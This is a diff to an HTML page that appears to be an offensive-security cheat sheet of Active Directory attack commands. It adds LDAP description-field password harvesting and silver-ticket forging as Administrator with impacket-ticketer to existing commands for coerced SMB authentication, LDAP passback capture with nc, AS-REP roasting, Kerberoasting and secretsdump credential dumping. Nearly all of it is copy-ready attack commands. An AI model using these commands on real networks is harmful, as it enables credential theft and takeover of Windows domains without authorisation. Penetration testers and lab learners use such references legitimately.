@@ -100,7 +100,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.4.2</span>
+  <span class="ver">v1.5.0</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -274,10 +274,14 @@ smbclient //$IP/&lt;share&gt; -N -c &#x27;put @pwn.scf&#x27;    # .url (URL=file
 # LDAP passback - point a printer/appliance&#x27;s LDAP server at you, its bind arrives in cleartext
 sudo nc -lvnp 389</code></pre></div>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute 10000     # real user list from a null/guest session
+nxc ldap $IP -u &lt;user&gt; -p &lt;pass&gt; -M user-desc  # description/info fields hold reset passwords
 impacket-lookupsid &lt;domain&gt;/guest@$IP 10000   # same idea, via SID walking
 kerbrute userenum -d &lt;domain&gt; --dc $IP users.txt
 impacket-GetNPUsers &lt;domain&gt;/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip $IP -request               # Kerberoast
+# svc account hash -&gt; Administrator on THAT service, no krbtgt/DCSync needed (silver ticket):
+impacket-ticketer -nthash &lt;svc-nt-hash&gt; -domain-sid S-1-5-21-... -domain &lt;dom&gt; -spn MSSQLSvc/sql.&lt;dom&gt;:1433 -user-id 500 Administrator
+export KRB5CCNAME=Administrator.ccache      # then any impacket tool with -k -no-pass
 impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@$IP
 bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -ns $IP -c all</code></pre></div>
 <hr>
